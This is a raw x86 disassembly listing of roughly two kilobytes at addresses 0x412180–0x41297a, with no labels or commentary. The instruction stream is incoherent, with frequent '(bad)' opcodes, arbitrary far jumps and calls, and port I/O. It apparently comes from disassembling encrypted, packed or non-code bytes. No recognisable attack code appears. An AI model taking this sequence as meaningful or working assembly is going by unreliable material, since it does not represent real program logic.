  412180:	ret    
  412181:	ret    0x7b1e
  412184:	fsubr  st(1),st
  412186:	repz mov bh,0xb9
  412189:	mov    ch,0x4f
  41218b:	mov    edi,0x2a085fdf
  412190:	jmp    0xad78:0x5915600c
  412197:	lods   eax,DWORD PTR ds:[esi]
  412198:	dec    ebx
  412199:	cwde   
  41219a:	or     DWORD PTR [eax+ebp*1-0x2644953c],0xffffffc5
  4121a2:	es jge 0x412180
  4121a5:	push   ebx
  4121a6:	fistp  WORD PTR [edi+0x31]
  4121a9:	xchg   BYTE PTR [edx+0x5e604302],bh
  4121af:	(bad)  [edx+0x6b]
  4121b2:	retf   0x9bbe
  4121b5:	test   BYTE PTR [eax-0x1a],bl
  4121b8:	mov    edx,0x11bf11a4
  4121bd:	pushf  
  4121be:	inc    esp
  4121bf:	(bad)  
  4121c0:	stos   DWORD PTR es:[edi],eax
  4121c1:	push   esp
  4121c2:	xchg   edx,eax
  4121c3:	stos   DWORD PTR es:[edi],eax
  4121c4:	xlat   BYTE PTR ds:[ebx]
  4121c5:	out    dx,eax
  4121c6:	test   al,0x6
  4121c8:	xchg   edx,eax
  4121c9:	cmp    eax,0x9dd5d657
  4121ce:	jmp    0x41216e
  4121d0:	xor    ch,ah
  4121d2:	cwde   
  4121d3:	loop   0x412201
  4121d5:	scas   al,BYTE PTR es:[edi]
  4121d6:	loopne 0x41219a
  4121d8:	mov    al,0x99
  4121da:	lods   al,BYTE PTR ds:[esi]
  4121db:	pop    ebx
  4121dc:	mov    gs,esp
  4121de:	cmovp  ebx,DWORD PTR [esi-0xd561a44]
  4121e5:	push   ebp
  4121e6:	and    bl,BYTE PTR [esi]
  4121e8:	xchg   ebx,eax
  4121e9:	enter  0x23a9,0xca
  4121ed:	mov    BYTE PTR [edi+edx*4],ah
  4121f0:	mov    bl,0xf2
  4121f2:	ss nop
  4121f4:	nop
  4121f5:	iret   
  4121f6:	pop    ebp
  4121f7:	sub    ecx,DWORD PTR ds:0xab679dde
  4121fd:	fistp  QWORD PTR [edi+0x154247b1]
  412203:	fild   WORD PTR [ecx+ebx*4+0x1fe853bf]
  41220a:	outs   dx,BYTE PTR ds:[esi]
  41220b:	mov    cl,0xc9
  41220d:	ret    
  41220e:	arpl   WORD PTR [ebp-0x76becd4c],dx
  412214:	bound  eax,QWORD PTR [esi-0x1508a134]
  41221a:	inc    ebp
  41221b:	stos   DWORD PTR es:[edi],eax
  41221c:	or     edi,DWORD PTR [esp+eiz*4]
  41221f:	xor    al,0xcc
  412221:	sub    al,0xd7
  412223:	xlat   BYTE PTR ds:[ebx]
  412224:	sub    al,0x20
  412226:	out    0xd9,al
  412228:	jecxz  0x4121af
  41222a:	fs pop ebx
  41222c:	mov    edi,0xeb644c5e
  412231:	fcmovnb st,st(2)
  412233:	mov    fs,WORD PTR [eax-0x761f5edb]
  412239:	add    BYTE PTR [ebp-0x77c28a9e],dl
  41223f:	sar    BYTE PTR [esp+eax*2],1
  412242:	dec    edi
  412243:	lds    edi,FWORD PTR [esi-0x31]
  412246:	inc    ebp
  412247:	pop    esi
  412248:	out    0xcc,eax
  41224a:	popf   
  41224b:	mov    dh,bh
  41224d:	xlat   BYTE PTR ds:[ebx]
  41224e:	or     al,0x19
  412250:	lsl    edi,WORD PTR [ebx+ecx*8-0x5a]
  412255:	jecxz  0x4121f0
  412257:	call   0xa0b0:0x4996df56
  41225e:	scas   al,BYTE PTR es:[edi]
  41225f:	mov    dh,0xa0
  412261:	dec    esp
  412262:	xchg   ecx,eax
  412263:	jo     0x4121ec
  412265:	nop
  412266:	loopne 0x4121ec
  412268:	into   
  412269:	gs jo  0x41224f
  41226c:	or     al,0x30
  41226e:	xchg   edx,eax
  41226f:	inc    ebx
  412270:	xchg   ebx,eax
  412271:	adc    al,0x38
  412273:	rol    dl,0x33
  412276:	loopne 0x4122c8
  412278:	dec    edx
  412279:	inc    BYTE PTR [esi+ebp*2-0x5bcf3236]
  412280:	mov    ch,0x9b
  412282:	push   es
  412283:	cmp    al,0x97
  412285:	cld    
  412286:	adc    al,0xa3
  412288:	inc    esi
  412289:	into   
  41228a:	adc    BYTE PTR [edx+edi*1],dh
  41228d:	add    bh,BYTE PTR [edi-0x51]
  412290:	dec    ebx
  412291:	pop    ds
  412292:	add    eax,0x2df75b5d
  412297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412298:	sbb    DWORD PTR [eax-0x30],ebx
  41229b:	sbb    ebx,DWORD PTR [ecx-0x2f]
  41229e:	(bad)  
  41229f:	mov    cl,0x75
  4122a1:	jecxz  0x412303
  4122a3:	mov    bl,0xb5
  4122a5:	mov    ah,0x43
  4122a7:	adc    al,0xbe
  4122a9:	stc    
  4122aa:	xchg   ebx,eax
  4122ab:	mov    bh,BYTE PTR [eax]
  4122ad:	mov    eax,ds:0xf234a16a
  4122b2:	mov    bh,0x96
  4122b4:	sbb    BYTE PTR [ecx],bh
  4122b6:	dec    esi
  4122b7:	cmp    ecx,DWORD PTR [ebx-0x51]
  4122ba:	push   ss
  4122bb:	shl    DWORD PTR [edx-0x17],1
  4122be:	int    0x9f
  4122c0:	lds    eax,FWORD PTR [eax+ecx*2+0x64]
  4122c4:	jns    0x412301
  4122c6:	dec    edi
  4122c7:	aam    0xdc
  4122c9:	xchg   BYTE PTR [esi],bl
  4122cb:	push   ebp
  4122cc:	mov    ebx,0x148017b6
  4122d1:	daa    
  4122d2:	iretw  
  4122d4:	xor    al,0x4e
  4122d6:	xchg   esi,eax
  4122d7:	ss jle 0x412262
  4122da:	and    eax,0x24ff4b58
  4122df:	sahf   
  4122e0:	mov    edx,DWORD PTR [edi+eax*4-0x50ed189b]
  4122e7:	sbb    BYTE PTR [edx-0x9],dl
  4122ea:	jl     0x412274
  4122ec:	pushf  
  4122ed:	or     ecx,0xffffffaf
  4122f0:	imul   esp,ebx,0xdc81dcfa
  4122f6:	aad    0x91
  4122f8:	push   ecx
  4122f9:	cmp    eax,0x357a9cbe
  4122fe:	test   eax,0x6fcc99d
  412303:	outs   dx,BYTE PTR ds:[esi]
  412304:	test   BYTE PTR [edi+edi*4+0x69],dh
  412308:	pop    eax
  412309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41230a:	(bad)  
  41230c:	imul   ecx,ebx,0xcd680a8b
  412312:	adc    eax,0x8c9f2ec0
  412317:	(bad)  
  412318:	mov    DWORD PTR [edx],0xdac8ef8b
  41231e:	mov    WORD PTR [ecx],gs
  412320:	jle    0x4122ab
  412322:	sti    
  412323:	mov    ch,0xb9
  412325:	sqrtps xmm5,xmm5
  412328:	lea    eax,[edx-0x5e]
  41232b:	mov    WORD PTR es:[eax],?
  41232e:	adc    ebp,esi
  412330:	cdq    
  412331:	nop
  412332:	pop    esp
  412333:	add    al,0xf6
  412335:	cdq    
  412336:	pop    ebp
  412337:	cli    
  412338:	rcr    bh,1
  41233a:	std    
  41233b:	or     eax,DWORD PTR [esi]
  41233d:	sub    DWORD PTR [edx+0x2a3c26b3],edx
  412343:	outs   dx,DWORD PTR ds:[esi]
  412344:	lods   al,BYTE PTR ds:[esi]
  412345:	call   0x8c54e3f0
  41234a:	mov    ds:0xf391486b,eax
  41234f:	inc    esp
  412351:	clc    
  412352:	jg     0x412397
  412354:	adc    eax,edi
  412356:	xchg   BYTE PTR [edi+0x31],ch
  412359:	dec    ebp
  41235a:	popa   
  41235b:	lock pop ds
  41235d:	mov    ch,0xd8
  41235f:	xor    BYTE PTR [esi-0x422eb4df],dh
  412365:	std    
  412366:	xor    al,0x7c
  412368:	ins    DWORD PTR es:[edi],dx
  412369:	or     al,0x2a
  41236b:	mov    bl,0x72
  41236d:	and    dh,BYTE PTR [ecx]
  41236f:	dec    esp
  412370:	mov    ebx,0x5f07d3b9
  412375:	xchg   ebp,eax
  412376:	jno    0x412335
  412378:	aam    0x8a
  41237a:	fs and dl,BYTE PTR gs:[ecx+0x46]
  41237f:	into   
  412380:	mov    ds:0xdf11a328,eax
  412385:	inc    esp
  412386:	mov    eax,ds:0x344519ad
  41238b:	xchg   esi,eax
  41238c:	pop    eax
  41238d:	mov    ecx,0x714fe8fb
  412392:	add    al,0x7f
  412394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412395:	(bad)  
  412396:	std    
  412397:	dec    ebx
  412398:	in     al,0x20
  41239a:	cmp    eax,DWORD PTR [ecx-0x40]
  41239d:	cli    
  41239e:	fsubr  st,st(3)
  4123a0:	sahf   
  4123a1:	(bad)  
  4123a2:	hlt    
  4123a3:	inc    ebx
  4123a4:	sti    
  4123a5:	jae    0x4123d5
  4123a7:	shr    BYTE PTR [ecx+0x25],0x6a
  4123ab:	jl     0x412404
  4123ad:	dec    edi
  4123ae:	cmp    al,0x25
  4123b0:	mov    ch,0xc5
  4123b2:	js     0x412345
  4123b4:	pop    ss
  4123b5:	pop    es
  4123b6:	lods   al,BYTE PTR ds:[esi]
  4123b7:	xor    eax,0x551c5e79
  4123bc:	stos   BYTE PTR es:[edi],al
  4123bd:	in     al,0x2c
  4123bf:	cld    
  4123c0:	or     al,dl
  4123c2:	add    esp,DWORD PTR [esi+0x20]
  4123c5:	jnp    0x412358
  4123c7:	test   eax,0xa8b28d7d
  4123cc:	mov    al,ds:0x4a77901c
  4123d1:	adc    DWORD PTR [esi-0x5a],esi
  4123d4:	and    esp,DWORD PTR [edx]
  4123d6:	xchg   ecx,eax
  4123d7:	sbb    bl,BYTE PTR [edx-0x40]
  4123da:	push   ebp
  4123db:	dec    edx
  4123dc:	push   ecx
  4123dd:	xchg   ebx,eax
  4123de:	dec    esi
  4123df:	push   ds
  4123e0:	idiv   DWORD PTR [ebp+0x52328ef6]
  4123e6:	pop    esp
  4123e7:	xor    ebx,DWORD PTR ds:0xfcc00553
  4123ed:	push   0x4239859
  4123f2:	add    al,0x9
  4123f4:	mov    ch,0xee
  4123f6:	popa   
  4123f7:	fld    TBYTE PTR [ebx-0x6]
  4123fa:	hlt    
  4123fb:	rol    ch,0xc0
  4123fe:	mov    ds:0xca000a62,eax
  412403:	mov    dh,0x40
  412405:	mov    ch,0x85
  412407:	mov    edx,0xf25279d8
  41240c:	jae    0x41245c
  41240e:	mov    al,ds:0xae1f1b1
  412413:	sbb    DWORD PTR [edx],esp
  412415:	mov    bh,0xa4
  412417:	xor    DWORD PTR [eax+0x60],ebx
  41241a:	lahf   
  41241b:	mov    cl,ah
  41241d:	push   ss
  41241e:	fbld   TBYTE PTR [edx-0x3]
  412421:	jno    0x41246c
  412423:	push   edx
  412424:	cmc    
  412425:	test   eax,0xd42919b2
  41242a:	cli    
  41242b:	jg     0x412401
  41242d:	inc    ebp
  41242e:	call   0xa3f1:0x9f3e5fa3
  412435:	stos   BYTE PTR es:[edi],al
  412436:	xchg   edi,eax
  412437:	or     BYTE PTR [ebp+0x2e],bl
  41243a:	mov    ?,WORD PTR [ebx+0x700c7058]
  412440:	mov    eax,ds:0xfe205406
  412445:	mov    bl,0x61
  412447:	mov    esi,0xe09daca9
  41244c:	jecxz  0x41246f
  41244e:	jge    0x412439
  412450:	(bad)
  412454:	xchg   ebx,eax
  412455:	scas   eax,DWORD PTR es:[edi]
  412456:	std    
  412457:	mov    ebx,0xd6ecd950
  41245c:	ins    DWORD PTR es:[edi],dx
  41245d:	mov    dh,0xe6
  41245f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412460:	idiv   DWORD PTR [edx-0x42c43fe5]
  412466:	dec    BYTE PTR [edx+0x746069bf]
  41246c:	rcl    BYTE PTR [eax-0x73],0x31
  412470:	jnp    0x412464
  412472:	and    dl,ch
  412474:	gs jmp 0x4123fa
  412477:	push   edx
  412478:	stos   DWORD PTR es:[edi],eax
  412479:	lods   eax,DWORD PTR ds:[esi]
  41247a:	sti    
  41247b:	and    DWORD PTR ds:0xc7c3fad7,ebp
  412481:	mov    BYTE PTR [eax+0x57],cl
  412484:	mov    ds:0x633b16c,eax
  412489:	cld    
  41248a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41248b:	or     BYTE PTR [ebx+0x5e442a71],ch
  412491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412492:	rcl    BYTE PTR [ebx+edi*1-0x125f65c9],cl
  412499:	xor    ch,BYTE PTR [ebp+0x73aa99db]
  41249f:	(bad)  
  4124a0:	xchg   DWORD PTR [eax+0xece9d1],esp
  4124a6:	fnsave [ebx-0x49158fa7]
  4124ac:	daa    
  4124ad:	adc    al,0x63
  4124af:	jns    0x412516
  4124b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124b2:	mov    eax,ds:0x3873bace
  4124b7:	inc    esp
  4124b8:	popa   
  4124b9:	jmp    0xc4ccd320
  4124be:	daa    
  4124bf:	push   ebp
  4124c0:	mov    esp,DWORD PTR [esi]
  4124c2:	int    0x16
  4124c4:	or     edx,DWORD PTR [edx+0x14951b21]
  4124ca:	inc    ebp
  4124cb:	mov    ebp,0x807db46c
  4124d0:	imul   BYTE PTR ds:0x17c0132e
  4124d6:	loope  0x412547
  4124d8:	out    dx,eax
  4124d9:	scas   al,BYTE PTR es:[edi]
  4124da:	xlat   BYTE PTR ds:[ebx]
  4124db:	mov    al,ds:0xf44ce2f7
  4124e0:	leave  
  4124e1:	jne    0x412552
  4124e3:	outs   dx,DWORD PTR ds:[esi]
  4124e4:	outs   dx,DWORD PTR ds:[esi]
  4124e5:	adc    esp,esp
  4124e7:	cwde   
  4124e8:	rcr    bl,1
  4124ea:	imul   ecx,esp,0x202130bc
  4124f0:	fisttp QWORD PTR ds:0x217e48cf
  4124f6:	arpl   WORD PTR [ebx+0x2bda4d70],bp
  4124fc:	das    
  4124fd:	sbb    dl,BYTE PTR [eax]
  4124ff:	std    
  412500:	xchg   BYTE PTR [ebp+ebx*8-0x2d],dl
  412504:	hlt    
  412505:	dec    eax
  412506:	rcl    DWORD PTR ds:0x182d3dfa,1
  41250c:	dec    edi
  41250d:	(bad)  
  41250e:	push   0x28587bc1
  412513:	out    dx,eax
  412514:	pop    edi
  412515:	ret    
  412516:	sar    DWORD PTR [ebp+0x6df36b09],1
  41251c:	fisubr WORD PTR [ebx+0x5b]
  41251f:	push   0x8eb7a568
  412524:	ficom  WORD PTR ds:0x3c91f97
  41252a:	dec    esi
  41252b:	xor    BYTE PTR [ebp+0x59],dl
  41252e:	mov    cl,BYTE PTR [esi+0x7f]
  412531:	ss mov dh,0x3e
  412534:	iret   
  412535:	arpl   WORD PTR [ebp+0x64],ax
  412538:	pop    es
  412539:	das    
  41253a:	push   esp
  41253b:	shl    DWORD PTR [eax-0x3666b825],1
  412541:	repnz mov esp,0x81157d7a
  412547:	mov    edi,0x4c1c63e0
  41254c:	sbb    esi,DWORD PTR [edi]
  41254e:	inc    ebp
  41254f:	add    al,0x27
  412551:	sub    BYTE PTR [ecx+0x8c1a0a2],dh
  412557:	or     ecx,DWORD PTR [ecx+0x3]
  41255a:	loopne 0x4124dc
  41255c:	dec    ecx
  41255d:	fwait
  41255e:	adc    DWORD PTR [ecx+edi*8-0x5af7d13b],esp
  412565:	test   eax,0x50fbf020
  41256a:	sub    DWORD PTR [eax+0x15346fca],esi
  412570:	pushf  
  412571:	jge    0x4124f4
  412573:	sub    DWORD PTR [eax-0x7da7b7c3],edi
  412579:	inc    edx
  41257a:	push   edi
  41257b:	aas    
  41257c:	dec    edx
  41257d:	push   edx
  41257e:	gs retf 
  412580:	lea    ecx,[ebp-0x6615b48b]
  412586:	int    0x75
  412588:	cdq    
  412589:	pop    ebx
  41258a:	cmp    cl,ah
  41258c:	scas   eax,DWORD PTR es:[edi]
  41258d:	adc    al,BYTE PTR [ecx]
  41258f:	cmp    BYTE PTR [edi-0x53],dl
  412592:	int    0x35
  412594:	cld    
  412595:	inc    eax
  412596:	imul   edx,DWORD PTR [ebp-0x83e4b52],0x62
  41259d:	fnstcw WORD PTR [edi+0xb]
  4125a0:	or     dl,bh
  4125a2:	into   
  4125a3:	push   esi
  4125a4:	(bad)  
  4125a6:	cmc    
  4125a7:	test   DWORD PTR [esi],eax
  4125a9:	push   eax
  4125aa:	xor    edx,ecx
  4125ac:	mov    gs:0xfab2101e,al
  4125b2:	mov    cl,0xf6
  4125b4:	inc    ecx
  4125b5:	jnp    0x412595
  4125b7:	sub    al,0x56
  4125b9:	mov    cl,0x16
  4125bb:	push   edx
  4125bc:	movaps XMMWORD PTR [edx-0x3c],xmm6
  4125c0:	jno    0x41255d
  4125c2:	cmp    eax,0xf17e3770
  4125c7:	sbb    BYTE PTR [ebx-0x45],dh
  4125ca:	sbb    bl,bl
  4125cc:	push   ebx
  4125cd:	jecxz  0x4125b2
  4125cf:	mov    ss,WORD PTR [edx-0x15]
  4125d2:	lahf   
  4125d3:	lods   eax,DWORD PTR ds:[esi]
  4125d4:	test   al,0xac
  4125d6:	jmp    0xbee65c09
  4125db:	int    0x2b
  4125dd:	enter  0x10b1,0xa0
  4125e1:	imul   ebx,DWORD PTR [edx],0x37e96234
  4125e7:	mov    ebx,0xe524bd4c
  4125ec:	cwde   
  4125ed:	mov    esi,0xb080941
  4125f2:	sub    cl,0x9
  4125f5:	adc    edi,ecx
  4125f7:	jp     0x412660
  4125f9:	cdq    
  4125fa:	(bad)  
  4125fb:	sub    DWORD PTR [ebx-0x32],eax
  4125fe:	push   cs
  4125ff:	(bad)  
  412600:	jae    0x4125f3
  412602:	je     0x41260a
  412604:	jmp    FWORD PTR [edi]
  412606:	fsubr  QWORD PTR [edi]
  412608:	cmp    ecx,ebx
  41260a:	test   BYTE PTR [esi],al
  41260c:	xchg   edi,eax
  41260d:	and    edi,DWORD PTR [eax-0x25cf9cfe]
  412613:	pushf  
  412614:	and    ah,BYTE PTR [esi]
  412616:	mov    dl,al
  412618:	pop    ss
  412619:	data16 js 0x412651
  41261c:	add    eax,0x4d3667a1
  412621:	adc    eax,0xfd08ed01
  412626:	jnp    0x412666
  412628:	pop    eax
  412629:	xchg   edi,eax
  41262a:	xchg   edi,eax
  41262b:	pop    ecx
  41262c:	push   DWORD PTR [edx]
  41262e:	mov    ah,0x86
  412630:	test   DWORD PTR [edi+0xc],0xe15fe1fb
  412637:	imul   eax,esp,0x83c90c80
  41263d:	das    
  41263e:	adc    eax,0x96c3242
  412643:	ds mov esp,0x1f488774
  412649:	mov    al,0xd2
  41264b:	and    DWORD PTR [ebp+eiz*1-0x32e327d8],ebx
  412652:	add    DWORD PTR [ecx],esi
  412654:	leave  
  412655:	es mov al,0x4d
  412658:	call   0x633cf1e
  41265d:	shl    BYTE PTR [eax-0x20],0xbc
  412661:	push   cs
  412662:	xor    esp,ebp
  412664:	cmp    ah,cl
  412666:	dec    ecx
  412667:	cwde   
  412668:	aaa    
  412669:	jle    0x412660
  41266b:	cs sub bh,dh
  41266e:	out    0x58,eax
  412670:	adc    BYTE PTR [esp+ecx*4+0x7f7e147a],bh
  412677:	out    dx,eax
  412678:	sar    BYTE PTR [ecx],cl
  41267a:	loop   0x412671
  41267c:	std    
  41267d:	mov    ebp,0x8a1c6718
  412682:	imul   ebx,DWORD PTR [esi+esi*2],0xfffffff9
  412686:	dec    eax
  412687:	sahf   
  412688:	daa    
  412689:	ins    BYTE PTR es:[edi],dx
  41268a:	dec    ebp
  41268b:	fwait
  41268c:	leave  
  41268d:	pop    ebx
  41268e:	mov    ebp,0xdbe97e6f
  412693:	ror    BYTE PTR [esi-0x747e62af],1
  412699:	fs sub eax,0x78eb2d68
  41269f:	mov    ds:0xde1ac03d,al
  4126a4:	jnp    0x412637
  4126a6:	jg     0x4126d2
  4126a8:	or     al,BYTE PTR [edi]
  4126aa:	add    eax,0x40d1110e
  4126af:	jecxz  0x4126c6
  4126b1:	add    ah,bh
  4126b3:	iret   
  4126b4:	add    al,0x6d
  4126b6:	clc    
  4126b7:	sbb    bh,ah
  4126b9:	pop    esi
  4126ba:	leave  
  4126bb:	(bad)  
  4126bc:	stc    
  4126bd:	cmp    DWORD PTR [ebx+0x5ecdb82f],0xffffffe6
  4126c4:	or     eax,0x35d64431
  4126c9:	mov    edi,0x8ce6a4b7
  4126ce:	in     al,0x92
  4126d0:	cli    
  4126d1:	ret    0x6309
  4126d4:	sub    BYTE PTR [esi+eiz*2+0x483189d2],al
  4126db:	cdq    
  4126dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126dd:	mov    dl,0x7e
  4126df:	or     eax,0x697d294d
  4126e4:	add    DWORD PTR [edi],ebx
  4126e6:	iret   
  4126e7:	jmp    0x7570:0xa17a27a4
  4126ee:	out    0x92,al
  4126f0:	fs jno 0x412705
  4126f3:	pop    ecx
  4126f4:	cmp    eax,0x7db4e245
  4126f9:	sti    
  4126fa:	xchg   ecx,eax
  4126fb:	jae    0x41269a
  4126fd:	sti    
  4126fe:	(bad)  
  4126ff:	clc    
  412700:	or     eax,0x48ddecc7
  412705:	in     al,dx
  412706:	ficomp WORD PTR [edi-0x53]
  412709:	lods   al,BYTE PTR ds:[esi]
  41270a:	pop    edx
  41270b:	rcr    BYTE PTR [ebp-0x6689e74f],0x31
  412712:	popa   
  412713:	dec    ebp
  412714:	push   ds
  412715:	adc    eax,0x71e0ce60
  41271a:	lods   al,BYTE PTR ds:[esi]
  41271b:	add    ebp,eax
  41271d:	mov    al,ah
  41271f:	dec    edx
  412720:	(bad)  
  412721:	mov    bl,BYTE PTR [eax]
  412723:	push   edi
  412724:	cs pop edx
  412726:	adc    BYTE PTR [esi+0x55e7d3b3],ch
  41272c:	(bad)  
  41272d:	shl    DWORD PTR [ebp-0x69842165],0xc6
  412734:	jnp    0x412794
  412736:	sub    eax,0xbf5b244d
  41273b:	andps  xmm5,XMMWORD PTR [ecx-0x70cbc922]
  412742:	cmp    esi,ecx
  412744:	mov    ebp,0xbf7416da
  412749:	jo     0x4126e9
  41274b:	push   ds
  41274c:	shr    BYTE PTR [edx+ebx*8],1
  41274f:	or     BYTE PTR [ecx-0x1a],bl
  412752:	pop    esp
  412753:	dec    ecx
  412754:	out    dx,eax
  412755:	leave  
  412756:	iret   
  412757:	dec    edx
  412758:	xchg   ecx,eax
  412759:	std    
  41275a:	loop   0x4127b2
  41275c:	cmp    cl,al
  41275e:	mov    dl,0x50
  412760:	push   0x7ca2d719
  412765:	fbstp  TBYTE PTR ds:0x5e8e7a88
  41276b:	leave  
  41276c:	dec    ebx
  41276d:	pop    ds
  41276e:	les    edi,FWORD PTR [ecx+0x42]
  412771:	call   0x198a:0x13f4396e
  412778:	mov    ds:0xceb1f8d1,al
  41277d:	arpl   si,di
  41277f:	ror    DWORD PTR [eax+0x5d],cl
  412782:	mov    dh,0xac
  412784:	mov    bl,0xe3
  412786:	or     al,0xf8
  412788:	imul   edi,DWORD PTR [ecx-0x49b2bb6d],0x30
  41278f:	mov    eax,0x23705cbd
  412794:	sahf   
  412795:	aam    0x8a
  412797:	pop    es
  412798:	xchg   sp,ax
  41279a:	jae    0x412806
  41279c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41279d:	hlt    
  41279e:	xchg   ebp,eax
  41279f:	in     al,0xf9
  4127a1:	push   ebp
  4127a2:	fs out 0xb8,al
  4127a5:	call   0x8ab8:0x4bd77cf7
  4127ac:	cld    
  4127ad:	sub    dh,0x70
  4127b0:	xchg   ebx,eax
  4127b1:	fidiv  WORD PTR [ebx-0x28]
  4127b4:	sub    al,BYTE PTR ds:0x5f11dd21
  4127ba:	sbb    al,0x0
  4127bc:	mov    ah,0x49
  4127be:	arpl   WORD PTR [edx-0x264b653a],ax
  4127c4:	test   al,0x58
  4127c6:	into   
  4127c7:	jb     0x412785
  4127c9:	mov    al,ds:0x81e20ce3
  4127ce:	dec    esp
  4127cf:	xchg   ebx,eax
  4127d0:	test   BYTE PTR [ebx+0x26],cl
  4127d3:	jmp    0x41278d
  4127d5:	ret    
  4127d6:	jg     0x4127af
  4127d8:	loop   0x412807
  4127da:	test   DWORD PTR [ebp+eiz*4-0x80],esi
  4127de:	lds    eax,FWORD PTR [edi+0x4b]
  4127e1:	xchg   ebx,eax
  4127e2:	push   edx
  4127e3:	(bad)  [eax+0x71]
  4127e6:	ret    0xa113
  4127e9:	sub    DWORD PTR [ebx],ebp
  4127eb:	xchg   edx,eax
  4127ec:	xor    DWORD PTR [ebp-0x1dbb3339],ebp
  4127f2:	mov    bh,0xd
  4127f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127f5:	test   eax,0x6983df80
  4127fa:	int3   
  4127fb:	or     al,0xa1
  4127fd:	mov    esi,0xc0b885fd
  412802:	pop    esp
  412803:	call   0x4ea2:0x25259e42
  41280a:	or     DWORD PTR [ecx+0x77b79614],edx
  412810:	pop    ecx
  412811:	shl    ecx,0x15
  412814:	es inc edx
  412816:	ficomp DWORD PTR [ecx+0x4e]
  412819:	gs xchg ah,ah
  41281c:	sar    BYTE PTR [edi],0x78
  41281f:	lea    edi,[edi-0x1ec83fe2]
  412825:	mov    edx,0x5356eec
  41282a:	jmp    0x4127b5
  41282c:	dec    edi
  41282d:	inc    ebx
  41282e:	pop    edi
  41282f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412830:	inc    eax
  412831:	lea    ebp,[esi]
  412833:	in     al,0x4d
  412835:	adc    DWORD PTR fs:[esi-0xddb005],edx
  41283c:	test   eax,0x7c955b68
  412841:	jmp    0x30ff:0xfd73ce50
  412848:	mov    ds:0xdff5d02a,al
  41284d:	lock xor BYTE PTR [eax-0x6e],ch
  412851:	rcl    edi,cl
  412853:	shr    DWORD PTR [eax-0x58114b85],0x8c
  41285a:	fcmovnb st,st(5)
  41285c:	or     cl,BYTE PTR [ebx]
  41285e:	cmc    
  41285f:	rol    ebx,0xa9
  412862:	inc    esi
  412863:	jne    0x41280f
  412865:	or     ebp,0xffffffcc
  412868:	pop    esi
  412869:	(bad)  
  41286a:	hlt    
  41286b:	jns    0x41282b
  41286d:	push   ds
  41286e:	call   0x9018:0xb8e44652
  412875:	jb     0x4128ae
  412877:	fld    QWORD PTR [ecx]
  412879:	sbb    BYTE PTR [ebx],cl
  41287b:	mov    ebx,?
  41287d:	dec    esi
  41287e:	jmp    0x4128a6
  412880:	cld    
  412881:	lea    edi,[eax+ebp*1+0x356221f4]
  412888:	pop    ss
  412889:	sbb    DWORD PTR ss:[ebx],edx
  41288c:	jmp    0x412842
  41288e:	sbb    dl,BYTE PTR [edx+0x2]
  412891:	leave  
  412892:	cmp    ebp,DWORD PTR [ecx]
  412894:	fs ret 
  412896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412897:	int3   
  412898:	mov    ebx,0x7221210b
  41289d:	jge    0x41285b
  41289f:	adc    eax,0x5e59aae0
  4128a4:	mov    esp,0xa8ccf3e7
  4128a9:	into   
  4128aa:	inc    BYTE PTR [esi+eax*2]
  4128ad:	or     ch,bl
  4128af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b0:	in     eax,dx
  4128b1:	fidiv  DWORD PTR [ecx]
  4128b3:	inc    ebp
  4128b4:	test   eax,0x2fe69ce
  4128b9:	lea    edi,[ebp-0x4d0826d1]
  4128bf:	sbb    bl,BYTE PTR [eax-0x4b]
  4128c2:	cmp    DWORD PTR [esi],0x41bb818
  4128c8:	jns    0x4128d3
  4128ca:	sub    DWORD PTR [esi+0x40],edx
  4128cd:	js     0x4128a7
  4128cf:	push   ss
  4128d0:	fbld   TBYTE PTR [ecx+edi*2-0x48]
  4128d4:	or     BYTE PTR [ebx+ecx*1-0xc],al
  4128d8:	pop    eax
  4128d9:	xchg   ecx,eax
  4128da:	leave  
  4128db:	ret    0x5270
  4128de:	and    eax,0xb9a33ae7
  4128e3:	popf   
  4128e4:	mov    bh,0x7b
  4128e6:	cmp    DWORD PTR [ecx-0x4f],0x990dc407
  4128ed:	sbb    BYTE PTR [esi+esi*1],ah
  4128f0:	inc    ebx
  4128f1:	cmc    
  4128f2:	mov    edx,0x7657ed54
  4128f7:	lock loop 0x4128e2
  4128fa:	or     dx,dx
  4128fd:	ds inc esi
  4128ff:	jl     0x412969
  412901:	(bad)  
  412902:	fs mov ecx,0x499e0d11
  412908:	push   esi
  412909:	rcr    DWORD PTR [eax-0x37],1
  41290c:	rcr    BYTE PTR ds:[eax+0x7b],0x52
  412911:	add    al,0xfc
  412913:	jecxz  0x412899
  412915:	adc    al,0x38
  412917:	stc    
  412918:	stos   DWORD PTR es:[edi],eax
  412919:	scas   eax,DWORD PTR es:[edi]
  41291a:	ret    
  41291b:	push   ss
  41291c:	sbb    ch,BYTE PTR [ecx+0x16]
  41291f:	pop    es
  412920:	out    dx,al
  412921:	das    
  412922:	jge    0x4128e7
  412924:	sbb    al,0xe4
  412926:	add    eax,0x293a5cc2
  41292b:	rol    DWORD PTR [eax+0x3],0xa9
  41292f:	adc    dh,BYTE PTR [ecx+ebx*2-0x27f2e306]
  412936:	sub    bl,BYTE PTR [edi-0x4b]
  412939:	jno    0x41299d
  41293b:	mov    eax,ds:0x925e7181
  412940:	(bad)  
  412941:	mov    ch,0x5
  412943:	dec    ecx
  412944:	dec    esi
  412945:	xchg   ebp,eax
  412946:	mov    edi,0x2015b09d
  41294b:	test   ebp,edx
  41294d:	imul   ecx,DWORD PTR [edx+0x1ef0723],0x87daf952
  412957:	mov    esp,0x7fc3398b
  41295c:	jb     0x412911
  41295e:	jnp    0x412975
  412960:	dec    ebx
  412961:	or     dl,BYTE PTR [esi]
  412963:	dec    edi
  412964:	inc    edx
  412965:	test   esp,0xf77a6b69
  41296b:	mov    bl,0xc2
  41296d:	mov    esi,0x6674c553
  412972:	xchg   esi,eax
  412973:	sbb    ecx,eax
  412975:	mov    esp,0x33482954
  41297a:	mov    dh,0x86
